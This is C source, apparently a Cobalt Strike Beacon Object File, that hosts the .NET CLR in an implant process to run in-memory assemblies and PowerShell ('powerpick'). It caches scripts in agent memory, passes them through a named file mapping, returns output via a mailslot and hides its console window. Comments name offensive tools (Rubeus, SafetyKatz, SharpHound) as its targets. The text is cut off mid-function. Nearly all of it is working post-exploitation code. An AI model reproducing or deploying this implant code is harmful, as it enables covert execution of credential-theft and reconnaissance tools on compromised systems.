#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>

#include "beacon.h"
#include "powerpick_probe.h"

#define CHUNK_SIZE 65535  // Optimal chunk size for transmission
#define INITIAL_BUFFER_SIZE 65535  // Initial buffer size for small outputs
#define PP_IMPORT_KEY_PREFIX "ppimp-"
#define PP_IMPORT_KEY_PREFIX_LEN 6
#define PP_MAX_IMPORTS 16

void gen_rand_str(char *buffer, int offset, int length);

typedef struct _PP_IMPORT_BLOB {
    DWORD length;
    BYTE data[1];
} PP_IMPORT_BLOB, *PPP_IMPORT_BLOB;

static void PpMakeImportKey(char* outKey, size_t outLen, const char* name)
{
    size_t nameLen = MSVCRT$strlen(name);
    if (outLen < PP_IMPORT_KEY_PREFIX_LEN + nameLen + 1) {
        outKey[0] = '\0';
        return;
    }
    MSVCRT$memcpy(outKey, PP_IMPORT_KEY_PREFIX, PP_IMPORT_KEY_PREFIX_LEN);
    MSVCRT$memcpy(outKey + PP_IMPORT_KEY_PREFIX_LEN, name, nameLen + 1);
}

static BOOL PpStoreImport(const char* name, char* payload, int payloadLen)
{
    char key[96];
    PPP_IMPORT_BLOB existing;
    PPP_IMPORT_BLOB blob;
    SIZE_T allocSize;

    if (name == NULL || name[0] == '\0' || payload == NULL || payloadLen <= 0) {
        return FALSE;
    }

    PpMakeImportKey(key, sizeof(key), name);
    if (key[0] == '\0') {
        return FALSE;
    }

    existing = (PPP_IMPORT_BLOB)BeaconGetValue(key);
    if (existing != NULL) {
        BeaconRemoveValue(key);
        intFree(existing);
    }

    allocSize = sizeof(DWORD) + (SIZE_T)payloadLen;
    blob = (PPP_IMPORT_BLOB)intAlloc(allocSize);
    if (blob == NULL) {
        return FALSE;
    }

    blob->length = (DWORD)payloadLen;
    MSVCRT$memcpy(blob->data, payload, payloadLen);

    if (!BeaconAddValue(key, blob)) {
        intFree(blob);
        return FALSE;
    }

    return TRUE;
}

static BOOL PpDropImport(const char* name)
{
    char key[96];
    PPP_IMPORT_BLOB existing;

    if (name == NULL || name[0] == '\0') {
        return FALSE;
    }

    PpMakeImportKey(key, sizeof(key), name);
    if (key[0] == '\0') {
        return FALSE;
    }

    existing = (PPP_IMPORT_BLOB)BeaconGetValue(key);
    if (existing == NULL) {
        return FALSE;
    }

    BeaconRemoveValue(key);
    intFree(existing);
    return TRUE;
}

static BOOL PpWideEqualsAscii(LPCWSTR wide, const char* ascii)
{
    size_t i;
    if (wide == NULL || ascii == NULL) {
        return FALSE;
    }
    for (i = 0; ascii[i] != '\0'; i++) {
        if (wide[i] != (WCHAR)ascii[i]) {
            return FALSE;
        }
    }
    return wide[i] == L'\0';
}

static void PpWideToAscii(LPCWSTR wide, char* out, size_t outLen)
{
    size_t i;
    if (outLen == 0) {
        return;
    }
    if (wide == NULL) {
        out[0] = '\0';
        return;
    }
    for (i = 0; i + 1 < outLen && wide[i] != L'\0'; i++) {
        if (wide[i] > 127) {
            out[0] = '\0';
            return;
        }
        out[i] = (char)wide[i];
    }
    out[i] = '\0';
}

static BOOL PpCreateImportMap(
    PPP_IMPORT_BLOB* imports,
    int importCount,
    char* outMapName,
    size_t mapNameLen,
    HANDLE* outMapHandle,
    LPVOID* outView)
{
    DWORD totalSize = sizeof(DWORD);
    DWORD offset = 0;
    DWORD count = (DWORD)importCount;
    BYTE* view;
    int i;

    *outMapHandle = NULL;
    *outView = NULL;
    if (outMapName == NULL || mapNameLen < 20 || importCount <= 0) {
        return FALSE;
    }

    for (i = 0; i < importCount; i++) {
        totalSize += sizeof(DWORD) + imports[i]->length;
    }

    // Local\ppXXXXXXXX — ASCII-only so it survives CommandLineToArgvW.
    MSVCRT$memcpy(outMapName, "Local\\pp", 8);
    gen_rand_str(outMapName, 8, 8);

    *outMapHandle = KERNEL32$CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_READWRITE,
        0,
        totalSize,
        outMapName);
    if (*outMapHandle == NULL) {
        return FALSE;
    }

    *outView = KERNEL32$MapViewOfFile(
        *outMapHandle,
        FILE_MAP_ALL_ACCESS,
        0,
        0,
        totalSize);
    if (*outView == NULL) {
        KERNEL32$CloseHandle(*outMapHandle);
        *outMapHandle = NULL;
        return FALSE;
    }

    view = (BYTE*)(*outView);
    MSVCRT$memcpy(view + offset, &count, sizeof(count));
    offset += sizeof(count);

    for (i = 0; i < importCount; i++) {
        DWORD length = imports[i]->length;
        MSVCRT$memcpy(view + offset, &length, sizeof(length));
        offset += sizeof(length);
        if (length > 0) {
            MSVCRT$memcpy(view + offset, imports[i]->data, length);
            offset += length;
        }
    }

    return TRUE;
}

// Global cleanup tracking
typedef struct _CLEANUP_CONTEXT {
    char* pipePath;
    char* slotPath;
    wchar_t* wAssemblyArguments;
    wchar_t* wAppDomain;
    HINSTANCE hUser32;
    HANDLE mainHandle;
    HANDLE hFile;
    HANDLE hEvent;
    char* returnData;
    size_t returnDataSize;  // Track allocated size
    BOOL useChunking;  // Flag to indicate if chunking was used
    ICLRMetaHost* pClrMetaHost;
    ICLRRuntimeInfo* pClrRuntimeInfo;
    ICorRuntimeHost* pICorRuntimeHost;
    IUnknown* pAppDomainThunk;
    AppDomain* pAppDomain;
    Assembly* pAssembly;
    MethodInfo* pMethodInfo;
    SAFEARRAY* pSafeArray;
    SAFEARRAY* psaStaticMethodArgs;
    VARIANT vtPsa;
    VARIANT retVal;
    VARIANT obj;
    HANDLE importMapHandle;
    LPVOID importMapView;
} CLEANUP_CONTEXT, *PCLEANUP_CONTEXT;

// Initialize cleanup context
static void InitCleanupContext(PCLEANUP_CONTEXT ctx) {
    MSVCRT$memset(ctx, 0, sizeof(CLEANUP_CONTEXT));
    ctx->mainHandle = INVALID_HANDLE_VALUE;
    ctx->hFile = INVALID_HANDLE_VALUE;
    ctx->hEvent = INVALID_HANDLE_VALUE;
    ctx->useChunking = FALSE;
    ctx->returnDataSize = 0;
}

// Cleanup function
static void PerformCleanup(PCLEANUP_CONTEXT ctx, BOOL frConsole) {
    // Free allocated memory
    if (ctx->pipePath) { MSVCRT$free(ctx->pipePath); }
    if (ctx->slotPath) { MSVCRT$free(ctx->slotPath); }
    if (ctx->wAssemblyArguments) { MSVCRT$free(ctx->wAssemblyArguments); }
    if (ctx->wAppDomain) { MSVCRT$free(ctx->wAppDomain); }
    if (ctx->returnData) { intFree(ctx->returnData); }

    // Free library handles
    if (ctx->hUser32) { KERNEL32$FreeLibrary(ctx->hUser32); }

    // Close handles
    if (ctx->mainHandle != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->mainHandle); }
    if (ctx->hFile != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hFile); }
    if (ctx->hEvent != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hEvent); }

    if (ctx->importMapView) {
        KERNEL32$UnmapViewOfFile(ctx->importMapView);
        ctx->importMapView = NULL;
    }
    if (ctx->importMapHandle) {
        KERNEL32$CloseHandle(ctx->importMapHandle);
        ctx->importMapHandle = NULL;
    }

    // Clean up COM objects
    if (ctx->pSafeArray) { OLEAUT32$SafeArrayDestroy(ctx->pSafeArray); }
    if (ctx->psaStaticMethodArgs) { OLEAUT32$SafeArrayDestroy(ctx->psaStaticMethodArgs); }

    OLEAUT32$VariantClear(&ctx->vtPsa);
    OLEAUT32$VariantClear(&ctx->retVal);
    OLEAUT32$VariantClear(&ctx->obj);

    if (ctx->pMethodInfo) { ctx->pMethodInfo->lpVtbl->Release(ctx->pMethodInfo); }
    if (ctx->pAssembly) { ctx->pAssembly->lpVtbl->Release(ctx->pAssembly); }
    if (ctx->pICorRuntimeHost && ctx->pAppDomainThunk) {
        ctx->pICorRuntimeHost->lpVtbl->UnloadDomain(ctx->pICorRuntimeHost, ctx->pAppDomainThunk);
    }
    if (ctx->pAppDomain) { ctx->pAppDomain->lpVtbl->Release(ctx->pAppDomain); }
    if (ctx->pAppDomainThunk) { ctx->pAppDomainThunk->lpVtbl->Release(ctx->pAppDomainThunk); }
    if (ctx->pICorRuntimeHost) { ctx->pICorRuntimeHost->lpVtbl->Release(ctx->pICorRuntimeHost); }
    if (ctx->pClrRuntimeInfo) { ctx->pClrRuntimeInfo->lpVtbl->Release(ctx->pClrRuntimeInfo); }
    if (ctx->pClrMetaHost) { ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost); }

    // Free console if we created one
    if (frConsole) {
        _FreeConsole FreeConsole = (_FreeConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FreeConsole");
        if (FreeConsole) { FreeConsole(); }
    }
}

/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
    *mailHandle = KERNEL32$CreateMailslotA(lpszSlotName,
        0,                             //No maximum message size
        MAILSLOT_WAIT_FOREVER,         //No time-out for operations
        (LPSECURITY_ATTRIBUTES)NULL);  //Default security

    if (*mailHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    else
        return TRUE;
}

/*Read Mailslot with hybrid buffer/chunking approach and intermediate buffering*/
BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE* hEventOut) {
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    HANDLE hEvent;
    OVERLAPPED ov;
    size_t totalWritten = 0;
    BOOL chunkingMode = FALSE;

    // Intermediate buffer for chunking mode
    char* chunkBuffer = NULL;
    size_t chunkBufferSize = CHUNK_SIZE;
    size_t chunkBufferUsed = 0;

    hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
    if (NULL == hEvent) {
        return FALSE;
    }

    *hEventOut = hEvent;

    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    while (TRUE) {
        fResult = KERNEL32$GetMailslotInfo(*mailHandle,
            (LPDWORD)NULL,
            &cbMessage,
            &cMessage,
            (LPDWORD)NULL);

        if (!fResult) {
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        if (cbMessage == MAILSLOT_NO_MESSAGE) {
            break;
        }

        lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, cbMessage + 1);
        if (NULL == lpszBuffer) {
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        fResult = KERNEL32$ReadFile(*mailHandle,
            lpszBuffer,
            cbMessage,
            &cbRead,
            &ov);

        if (!fResult) {
            KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        // Ensure null termination
        lpszBuffer[cbRead] = '\0';

        // Get actual string length
        size_t msgLen = MSVCRT$strlen(lpszBuffer);

        // Check if message ends with newline
        BOOL hasNewline = FALSE;
        if (msgLen > 0) {
            if (lpszBuffer[msgLen - 1] == '\n' || lpszBuffer[msgLen - 1] == '\r') {
                hasNewline = TRUE;
            }
        }

        if (!chunkingMode && totalWritten + msgLen + (hasNewline ? 0 : 1) < outputSize - 1) {
            // Normal buffer mode
            MSVCRT$memcpy(output + totalWritten, lpszBuffer, msgLen);
            totalWritten += msgLen;

            // Add newline if message doesn't have one
            if (!hasNewline && msgLen > 0) {
                output[totalWritten] = '\n';
                totalWritten++;
            }

            output[totalWritten] = '\0';
        } else {
            // Switch to or continue in chunking mode
            if (!chunkingMode) {
                // First time switching - send accumulated buffer
                chunkingMode = TRUE;
                output[totalWritten] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s", output);

                // Allocate intermediate chunk buffer
                chunkBuffer = (char*)MSVCRT$malloc(chunkBufferSize);
                if (!chunkBuffer) {
                    KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
                    KERNEL32$CloseHandle(hEvent);
                    return FALSE;
                }
                chunkBufferUsed = 0;
            }

            // Calculate space needed including potential newline
            size_t neededSpace = msgLen + (hasNewline ? 0 : 1);
            size_t spaceLeft = chunkBufferSize - chunkBufferUsed - 1;

            if (neededSpace <= spaceLeft) {
                // Message fits in current chunk buffer
                MSVCRT$memcpy(chunkBuffer + chunkBufferUsed, lpszBuffer, msgLen);
                chunkBufferUsed += msgLen;

                // Add newline if needed
                if (!hasNewline && msgLen > 0) {
                    chunkBuffer[chunkBufferUsed] = '\n';
                    chunkBufferUsed++;
                }

                chunkBuffer[chunkBufferUsed] = '\0';

                // Send chunk if buffer is reasonably full (>75% capacity)
                if (chunkBufferUsed > (chunkBufferSize * 3 / 4)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                    chunkBuffer[0] = '\0';
                }
            } else {
                // Message doesn't fit - send current buffer and start new one
                if (chunkBufferUsed > 0) {
                    chunkBuffer[chunkBufferUsed] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                }

                // Check if this single message is larger than our chunk buffer
                if (neededSpace >= chunkBufferSize - 1) {
                    // Very large single message - send it directly
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", lpszBuffer);
                    if (!hasNewline) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n");
                    }
                    chunkBufferUsed = 0;
                } else {
                    // Normal message - add to empty buffer
                    MSVCRT$memcpy(chunkBuffer, lpszBuffer, msgLen);
                    chunkBufferUsed = msgLen;

                    if (!hasNewline && msgLen > 0) {
                        chunkBuffer[chunkBufferUsed] = '\n';
                        chunkBufferUsed++;
                    }

                    chunkBuffer[chunkBufferUsed] = '\0';
                }
            }
        }

        KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
    }

    if (chunkingMode) {
        // Send any remaining data in chunk buffer
        if (chunkBufferUsed > 0) {
            chunkBuffer[chunkBufferUsed] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
        }

        MSVCRT$free(chunkBuffer);

        // Final newline for chunked output
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    KERNEL32$CloseHandle(hEvent);
    return !chunkingMode;  // Return FALSE if chunking was used
}

// /*Improved version detection for .NET 4.x*/
// BOOL FindVersion(void * assembly, int length) {
//     char* assembly_c = (char*)assembly;
//
//     // Check for various .NET 4.x versions
//     char* v4_versions[] = {
//         "v4.0.30319",
//         "v4.5",
//         "v4.6",
//         "v4.7",
//         "v4.8"
//     };
//
//     int num_versions = sizeof(v4_versions) / sizeof(v4_versions[0]);
//
//     for (int v = 0; v < num_versions; v++) {
//         int version_len = MSVCRT$strlen(v4_versions[v]);
//
//         for (int i = 0; i < length - version_len; i++) {
//             BOOL found = TRUE;
//             for (int j = 0; j < version_len; j++) {
//                 if (v4_versions[v][j] != assembly_c[i + j]) {
//                     found = FALSE;
//                     break;
//                 }
//             }
//             if (found) {
//                 return 1;  // .NET 4.x found
//             }
//         }
//     }
//
//     return 0;  // .NET 2.0
// }

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRRuntimeInfo * *ppClrRuntimeInfo, ICorRuntimeHost * *ppICorRuntimeHost) {

    HRESULT hr = (HRESULT)NULL;

    hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

    if (hr == S_OK)
    {
        hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
        if (hr == S_OK)
        {
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
            if ((hr == S_OK) && fLoadable)
            {
                hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                if (hr == S_OK)
                {
                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
                }
                else
                {
                    BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get interface of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get runtime of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to create %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}

/*Check Console Exists*/
static BOOL consoleExists(void) {
    _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
    return !!GetConsoleWindow();
}

#define TMPBUFLEN 64

typedef BOOLEAN(WINAPI *RTLGENRANDOM)(PVOID, ULONG);

void gen_rand_str(char *buffer, int offset, int length)
{
    unsigned char randomBytes[TMPBUFLEN];

    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("advapi32.dll"), "SystemFunction036");
    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, TMPBUFLEN))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] gen_rand_str: RtlGenRandom failed");
        return;
    }

    int end = offset + length;
    if (end > TMPBUFLEN) end = TMPBUFLEN;

    for (int i = offset; i < end; i++)
    {
        unsigned char val = randomBytes[i] % 26;
        buffer[i] = 'A' + val;
    }
    buffer[end] = '\0';
}

/*BOF Entry Point*/
void go(IN PCHAR buffer, IN ULONG blength)
{
    CLEANUP_CONTEXT ctx;
    InitCleanupContext(&ctx);

    datap parser;
    BeaconDataParse(&parser, buffer, blength);

    size_t assemblyByteLen = 0;
    char* assemblyBytes = BeaconDataExtract(&parser, (int*)&assemblyByteLen);

    // Extract arguments with length checking
    size_t argumentsLen = 0;
    char* assemblyArguments = BeaconDataExtract(&parser, (int*)&argumentsLen);

    // Optional trailing payload (used by store)
    char* firstPayload = NULL;
    int firstPayloadLen = 0;
    if (BeaconDataLength(&parser) > 0) {
        firstPayload = BeaconDataExtract(&parser, &firstPayloadLen);
    }

    // store <name> + payload bytes -> cache script in agent memory (no CLR)
    if (assemblyArguments != NULL && MSVCRT$strncmp(assemblyArguments, "store ", 6) == 0) {
        const char* name = assemblyArguments + 6;
        while (*name == ' ') name++;
        if (*name == '\0' || firstPayload == NULL || firstPayloadLen <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] store requires a name and script payload");
            return;
        }
        if (!PpStoreImport(name, firstPayload, firstPayloadLen)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] failed to store session import '%s'", name);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Stored session import '%s' (%d bytes) in agent memory\n", name, firstPayloadLen);
        return;
    }

    // drop <name> [<name>...] -> free cached scripts (no CLR)
    if (assemblyArguments != NULL && MSVCRT$strncmp(assemblyArguments, "drop ", 5) == 0) {
        char* cursor = assemblyArguments + 5;
        int dropped = 0;
        while (*cursor != '\0') {
            char* nameStart;
            char* nameEnd;
            char saved;
            while (*cursor == ' ') cursor++;
            if (*cursor == '\0') break;
            nameStart = cursor;
            while (*cursor != '\0' && *cursor != ' ') cursor++;
            nameEnd = cursor;
            saved = *nameEnd;
            *nameEnd = '\0';
            if (PpDropImport(nameStart)) {
                dropped++;
                BeaconPrintf(CALLBACK_OUTPUT, "Dropped session import '%s'\n", nameStart);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] session import '%s' was not cached on the agent\n", nameStart);
            }
            *nameEnd = saved;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Dropped %d session import(s)\n", dropped);
        return;
    }

    // Validate arguments - if NULL, zero length, or contains only whitespace, treat as no arguments
    BOOL hasArguments = FALSE;
    if (assemblyArguments != NULL && argumentsLen > 0) {
        // Check if arguments contain any non-whitespace characters
        for (size_t i = 0; i < argumentsLen; i++) {
            if (assemblyArguments[i] != '\0' && assemblyArguments[i] != ' ' &&
                assemblyArguments[i] != '\t' && assemblyArguments[i] != '\n' &&
                assemblyArguments[i] != '\r') {
                hasArguments = TRUE;
                break;
            }
        }
    }

    // defaults
    char appDomain[TMPBUFLEN] = { 't', 'e', 's', 't', '-' };           gen_rand_str(appDomain, 5, 8);
    char pipeName[TMPBUFLEN]  = { 's', 'v', 'c', 't', 's', 't', '.' }; gen_rand_str(pipeName, 7, 12);
    char slotName[TMPBUFLEN]  = { 't', 's', 't', 's', 'l', 't', '-' }; gen_rand_str(slotName, 7, 8);

    BOOL mailSlot = 1;  // Always use mailslot to avoid deadlock issues
    ULONG entryPoint = 1;

    //Create slot and pipe names with proper memory management
    SIZE_T pipeNameLen = MSVCRT$strlen(pipeName);
    ctx.pipePath = MSVCRT$malloc(pipeNameLen + 10);
    if (!ctx.pipePath) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        return;
    }
    MSVCRT$memset(ctx.pipePath, 0, pipeNameLen + 10);
    MSVCRT$memcpy(ctx.pipePath, "\\\\.\\pipe\\", 9 );
    MSVCRT$memcpy(ctx.pipePath+9, pipeName, pipeNameLen+1 );

    SIZE_T slotNameLen = MSVCRT$strlen(slotName);
    ctx.slotPath = MSVCRT$malloc(slotNameLen + 14);
    if (!ctx.slotPath) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE);
        return;
    }
    MSVCRT$memset(ctx.slotPath, 0, slotNameLen + 14);
    MSVCRT$memcpy(ctx.slotPath, "\\\\.\\mailslot\\", 13 );
    MSVCRT$memcpy(ctx.slotPath+13, slotName, slotNameLen+1 );

    //Declare other variables
    HRESULT hr = (HRESULT)NULL;
    LPWSTR* argumentsArray = NULL;
    int argumentCount = 0;
    HANDLE stdOutput;
    HANDLE stdError;
    PPP_IMPORT_BLOB resolvedImports[PP_MAX_IMPORTS];
    int resolvedCount = 0;
    char importMapName[64];
    char importMapArg[80];
    size_t wideSize = 0;
    size_t wideSize2 = 0;
    BOOL success = 1;
    BOOL frConsole = 0;

    // Allocate initial buffer with configurable size
    ctx.returnDataSize = INITIAL_BUFFER_SIZE;
    ctx.returnData = (char*)intAlloc(ctx.returnDataSize);
    if (!ctx.returnData) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE);
        return;
    }
    memset(ctx.returnData, 0, ctx.returnDataSize);

    //Determine .NET assembly version
    //FindVersion() scans raw assembly bytes for CLR version strings but fails
    //when the PE metadata format doesn't contain them as plain text, causing
    //a fallback to CLR v2.0 which breaks all modern .NET 4.x tools (Rubeus,
    //Seatbelt, SafetyKatz, SharpHound, etc.). Since .NET 2.0 assemblies are
    //effectively extinct in offensive tooling, default to CLR v4.0.
    wchar_t* wNetVersion = L"v4.0.30319";

    //Handle argument conversion based on whether we have valid arguments
    if (hasArguments) {
        // Convert assemblyArguments to wide string
        size_t convertedChars = 0;
        wideSize = MSVCRT$strlen(assemblyArguments) + 1;
        ctx.wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
        if (!ctx.wAssemblyArguments) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
            PerformCleanup(&ctx, FALSE);
            return;
        }
        MSVCRT$mbstowcs_s(&convertedChars, ctx.wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

        // Parse arguments
        argumentsArray = SHELL32$CommandLineToArgvW(ctx.wAssemblyArguments, &argumentCount);

        // exec <cmd_b64> [import_name...] resolves cached imports from agent memory.
        // Import bodies are passed to managed via a named file mapping (not argv/stdin).
        if (argumentCount >= 2 &&
            argumentsArray != NULL &&
            PpWideEqualsAscii(argumentsArray[0], "exec")) {
            int i;
            for (i = 2; i < argumentCount && resolvedCount < PP_MAX_IMPORTS; i++) {
                char name[72];
                char key[96];
                PPP_IMPORT_BLOB blob;
                PpWideToAscii(argumentsArray[i], name, sizeof(name));
                if (name[0] == '\0') {
                    BeaconPrintf(CALLBACK_ERROR, "[!] invalid session import name");
                    PerformCleanup(&ctx, FALSE);
                    return;
                }
                PpMakeImportKey(key, sizeof(key), name);
                blob = (PPP_IMPORT_BLOB)BeaconGetValue(key);
                if (blob == NULL) {
                    BeaconPrintf(
                        CALLBACK_ERROR,
                        "[!] session import '%s' is not cached on the agent; re-run powerpick-load\n",
                        name);
                    PerformCleanup(&ctx, FALSE);
                    return;
                }
                resolvedImports[resolvedCount++] = blob;
            }

            if (resolvedCount > 0) {
                wchar_t mapArgW[96];
                size_t convertedMap = 0;
                size_t mapWideLen;
                wchar_t* durable;

                if (!PpCreateImportMap(
                        resolvedImports,
                        resolvedCount,
                        importMapName,
                        sizeof(importMapName),
                        &ctx.importMapHandle,
                        &ctx.importMapView)) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to stage session imports for the managed host");
                    PerformCleanup(&ctx, FALSE);
                    return;
                }

                // Managed argv becomes: exec <cmd_b64> @@Local\ppXXXXXXXX
                argumentCount = 3;
                MSVCRT$memcpy(importMapArg, "@@", 2);
                MSVCRT$memcpy(importMapArg + 2, importMapName, MSVCRT$strlen(importMapName) + 1);
                MSVCRT$mbstowcs_s(
                    &convertedMap,
                    mapArgW,
                    sizeof(mapArgW) / sizeof(wchar_t),
                    importMapArg,
                    _TRUNCATE);

                mapWideLen = MSVCRT$wcslen(mapArgW) + 1;
                durable = (wchar_t*)MSVCRT$malloc(mapWideLen * sizeof(wchar_t));
                if (!durable) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
                    PerformCleanup(&ctx, FALSE);
                    return;
                }
                MSVCRT$memcpy(durable, mapArgW, mapWideLen * sizeof(wchar_t));
                // Original argv had import names at [2+]; replace [2] with map token.
                argumentsArray[2] = durable;
            } else {
                argumentCount = 2;
            }
        }
    } else {
        // No arguments - create empty wide string
        ctx.wAssemblyArguments = (wchar_t*)MSVCRT$malloc(sizeof(wchar_t));
        if (!ctx.wAssemblyArguments) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
            PerformCleanup(&ctx, FALSE);
            return;
        }
        ctx.wAssemblyArguments[0] = L'\0';
        argumentsArray = NULL;
        argumentCount = 0;
    }

    //Convert appDomain to wide string
    size_t convertedChars2 = 0;
    wideSize2 = MSVCRT$strlen(appDomain) + 1;
    ctx.wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
    if (!ctx.wAppDomain) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE);
        return;
    }
    MSVCRT$mbstowcs_s(&convertedChars2, ctx.wAppDomain, wideSize2, appDomain, _TRUNCATE);

    //Create an array of strings for arguments
    ctx.vtPsa.vt = (VT_ARRAY | VT_BSTR);
    ctx.vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

    // Only populate array if we have arguments
    if (argumentCount > 0 && argumentsArray != NULL) {
        for (long i = 0; i < argumentCount; i++)
        {
            if (argumentsArray[i] != NULL) {
                OLEAUT32$SafeArrayPutElement(ctx.vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
            }
        }
    }

    //Start CLR
    success = StartCLR((LPCWSTR)wNetVersion, &ctx.pClrMetaHost, &ctx.pClrRuntimeInfo, &ctx.pICorRuntimeHost);

    if (success != 1) {
        PerformCleanup(&ctx, FALSE);
        return;
    }

    // Create unique mutex for synchronization
    char mutexName[TMPBUFLEN] = { 'm', 'x', '-' };
    gen_rand_str(mutexName, 3, 12);
    HANDLE hMutex = KERNEL32$CreateMutexA(NULL, TRUE, mutexName);

    success = MakeSlot(ctx.slotPath, &ctx.mainHandle);
    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create mailslot");
        KERNEL32$ReleaseMutex(hMutex);
        KERNEL32$CloseHandle(hMutex);
        PerformCleanup(&ctx, FALSE);
        return;
    }

    ctx.hFile = KERNEL32$CreateFileA(ctx.slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

    KERNEL32$ReleaseMutex(hMutex);
    KERNEL32$CloseHandle(hMutex);

    if (ctx.hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open mailslot for writing");
        PerformCleanup(&ctx, FALSE);
        return;
    }

    //Attach or create console
    BOOL attConsole = consoleExists();

    if (attConsole != 1)
    {
        frConsole = 1;
        _AllocConsole AllocConsole = (_AllocConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "AllocConsole");
        _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
        AllocConsole();

        //Hide Console Window
        ctx.hUser32 = KERNEL32$LoadLibraryA("user32.dll");
        if (ctx.hUser32) {
            _ShowWindow ShowWindow = (_ShowWindow)KERNEL32$GetProcAddress(ctx.hUser32, "ShowWindow");
            HWND wnd = GetConsoleWindow();
            if (wnd)
